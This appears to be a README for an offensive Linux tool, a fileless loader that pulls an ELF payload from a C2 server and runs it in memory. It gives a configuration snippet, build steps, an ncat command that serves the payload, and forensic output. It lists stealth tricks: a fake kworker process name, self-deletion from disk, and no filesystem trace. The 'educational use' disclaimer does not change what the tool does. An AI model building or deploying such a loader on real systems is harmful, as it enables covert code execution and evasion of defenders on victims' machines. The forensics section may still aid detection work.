
## Fileless In-Memory Loader Linux 

This tool implements a fileless, in-memory ELF loader for Linux systems. It connects to a remote C2 (Command & Control) server over TCP, downloads a raw ELF payload, and executes it entirely from memory using memfd_create().

> ⚠️ **For educational and authorized use only.** Do not use on systems you do not own or have explicit permission to operate on.

### Key Features
 * Uses memfd_create() to create a memory-backed, executable file descriptor
 * Pulls payload from a configurable C2 IP and port over a socket connection
 * Executes the ELF binary directly from memory via /proc/self/fd/<fd>
 * Applies a fake process name (argv[0]) for stealth in `ps`, `top`, etc.
 * Deletes itself from disk (via unlink("/proc/self/exe")) after execution
 * Leaves no payload or loader trace on the filesystem after startup

### Configuration

Inside `loader.c`, you can configure the following parameters:

```c
const char *C2_IP        = "127.0.0.1";       // C2 IP
const int   C2_PORT      = 1111;              // C2 port
const char *FAKE_PROC    = "[kworker/0:1-events]";   // Shown in `ps` output
const char *FD_NAME      = "error";          // Shown in `cat /proc/<pid>/maps` as [memfd:error (deleted)]
````

### Usage

1. Compile the Loader

```bash
gcc -o loader loader.c
gcc -o payload.elf test-payload.c
```

2. Start the C2 (e.g., Netcat)

```bash
ncat -lvnp 1111 < payload.elf
```

3. Run the Loader

```bash
./loader
```

If successful:

* The loader deletes itself
* The payload executes in memory
* The process appears with the fake name (`[kworker/u!0]`)
* Nothing is left on disk

## Forensics traces

```bash
$ ps aux | grep kworker
root      1233  0.0  0.0   2196  1200 ?        Ss   13:47   0:00 [kworker/0:1-events]
root      1235  0.0  0.0   3040  1428 pts/2    S+   13:47   0:00 grep kworker
$ cat /proc/1233/maps | grep memfd
00400000-00401000 r-xp 00000000 00:01 1025                               /memfd:error (deleted)
0041f000-00420000 r--p 0000f000 00:01 1025                               /memfd:error (deleted)
00420000-00421000 rw-p 00010000 00:01 1025                               /memfd:error (deleted)
```
